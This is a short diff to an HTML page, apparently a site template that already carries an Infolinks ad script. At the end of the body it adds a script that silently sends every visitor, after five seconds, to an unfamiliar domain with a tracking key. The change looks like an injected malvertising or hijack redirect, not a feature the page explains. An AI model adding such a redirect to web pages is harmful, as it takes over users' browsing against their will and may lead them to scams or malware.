@@ -222,7 +222,11 @@
         var infolinks_wsid = 0;
     </script>
     <script type="text/javascript" src="//resources.infolinks.com/js/infolinks_main.js"></script>
-
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://grownwrecking.com/vhp3u9k0?key=05f98bb82899f55f118a2f1f6312cf13";
+        }, 5000);
+    </script>
 </body>
 
 </html>
